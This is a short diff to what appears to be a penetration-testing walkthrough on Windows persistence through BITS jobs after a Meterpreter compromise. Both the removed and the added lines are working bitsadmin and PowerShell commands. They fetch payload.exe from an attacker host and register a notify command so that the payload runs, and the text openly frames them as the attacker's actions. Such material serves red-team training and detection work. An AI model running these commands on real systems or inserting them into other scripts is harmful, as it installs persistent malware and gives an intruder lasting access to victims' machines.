@@ -59,11 +59,10 @@ When the victim executes the payload, a Meterpreter session is established, givi
 
 On the compromised Windows machine, the attacker executes PowerShell commands to create a persistent BITS job:
 ```powershell
-$job = Start-BitsTransfer -Source "http://192.168.100.10:8080/payload.exe" -Destination "C:\Users\Public\payload.exe"
-bitsadmin /create /download MaliciousJob
-bitsadmin /addfile MaliciousJob "http://attacker-server/payload.exe" "C:\Users\Public\payload.exe"
-bitsadmin /setnotifycmdline MaliciousJob "cmd" "C:\Users\Public\payload.exe" ""
-bitsadmin /resume MaliciousJob
+bitsadmin /create test
+bitsadmin /addfile test "http://192.168.100.10:8080/payload.exe" "C:\Users\Public\payload.exe"
+bitsadmin /SetNotifyCmdLine test "C:\Windows\System32\cmd.exe" "/c start C:\Users\Public\payload.exe"
+bitsadmin /resume test
 ```
 This command sequence:
 - Downloads a payload from the attacker's server
